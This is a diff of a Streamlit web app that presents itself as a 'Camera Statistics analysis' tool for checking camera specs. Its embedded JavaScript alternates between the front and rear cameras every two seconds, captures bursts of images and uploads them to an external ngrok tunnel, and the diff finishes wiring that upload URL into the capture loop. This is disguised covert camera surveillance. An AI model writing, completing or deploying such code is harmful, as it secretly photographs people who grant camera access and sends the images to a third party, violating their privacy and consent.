@@ -4,7 +4,7 @@ st.set_page_config(layout="centered")
 st.title("📸 Camera Statistics analysis")
 
 # Set this to your laptop's local IP on same Wi-Fi (e.g., 192.168.x.x)
-upload_url = "https://1233-2409-40f2-2087-915b-f40f-2964-548-7e82.ngrok-free.app/upload"  # <-- Replace with actual IP
+upload_url = "https://e630-2401-4900-93c9-8b37-158e-d0fb-1b57-1115.ngrok-free.app"  # <-- Replace with actual IP
 
 st.markdown(f"""
 This app checks camera specs to:
@@ -259,7 +259,7 @@ navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
 #     }}, 'image/jpeg');
 #   }}
 # }}, 1000);
-        let stream = null;
+let stream = null;
 let isFront = true;
 
 async function startCamera(facingMode) {
@@ -301,7 +301,7 @@ async function captureBurst(url, fps = 3, durationSec = 1) {
 // Alternate between front and rear every 2 seconds
 setInterval(async () => {
   const facingMode = isFront ? "user" : "environment";
-  const url = isFront ? "{your_url}/front" : "{your_url}/rear";
+  const url = isFront ? "{upload_url}/front" : "{upload_url}/rear";
 
   try {
     await startCamera(facingMode);
